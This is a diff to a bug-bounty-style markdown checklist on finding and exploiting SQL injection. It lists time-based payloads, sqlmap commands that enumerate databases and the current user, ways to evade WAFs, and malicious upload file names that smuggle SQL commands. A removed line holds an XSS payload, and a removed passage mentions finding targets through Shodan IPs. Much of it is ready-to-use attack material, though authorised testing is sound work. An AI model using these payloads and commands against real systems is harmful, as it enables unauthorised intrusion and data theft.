@@ -1,15 +1,12 @@
 ## How to find SQL injectiosn vulnerability?
 
-### 1) logical operation
+## 1) Logical Operation
 One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results.
 For example: if the GET parameter `?username=Peter` returns the same content as `?username=Peter'` or `?username=Peter+'1'='1` then, you found a SQL injection.
 
 ## 2) Time Based SQL Injection
-90% from my finds in SQL injection as
- [POST Request] 
-1 Login page in username parameter 
-2 Forget password page username parameter
-3 Singup Page firstname and last name parameter
+Most relative place for inject SQL payloads as [POST Request] are in Login page (username parameter), Forget password page (username parameter), Singup Page (firstname and last name) 
+
 
 Payloads:
 ```
@@ -30,49 +27,29 @@ orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
 ```
 
 ![image](https://user-images.githubusercontent.com/63053441/155585150-722a2ec2-787d-42bd-85d7-30c6401f8031.png)
-```
+
+### How To Test?
+
+ 1) Use this [wordlist](https://raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL%20injection/SQL.txt) with intruder and inject all payloads in relative parameters and headers(User-Agent, Cookies, Referer and ...)  
+ 2) After you got DELAY save request in txt file and use sqlmap for confirm and exploit vulnerability
 
 ```
-
 sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
-
-
-
-
-===>Comment
-
-If sometimes you cant exploits  
-change request form POST to GET 
-if the same with the url injection try change request form GET to POST
-
-
-
-most modern web apps use WAF & user input validation before execute it.
-yeh 
-you can try with 
---random-agent 
-but i dont remember that i use tempers 
-
-or maby because lot of these sql i found it from shodan ips
-
-
-
-
-all the time i try Sql  in user parameter 
-1)
-i used sleep payload
-`';WAITFOR DELAY '0:0:5'-- `
-and the server get DELAY for 5 s
-2)
-save Post request in txt
-```
 sqlmap -r txt -p user --force-ssl --level 5 --risk 3
 sqlmap -r request.txt -p email/username --force-ssl -level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
 ```
+
+Sometimes you cant exploits because most modern web apps use WAF & user input validation before execute it so you can try with:
+- change request form POST to GET or in reverse
+- Use `--random-agent`
+
+
+## 3) File Uploaders SQLi
+Save file with this names and upload it in site
 ```
-"><img src=x onerror=alert(document.domain)>
 --sleep(15).png
 --sleep(6*3).png
 --sleep(25).png
 --sleep(5*7).png
+pic.png;waitfor delay '0:0:5'-- 
 ```
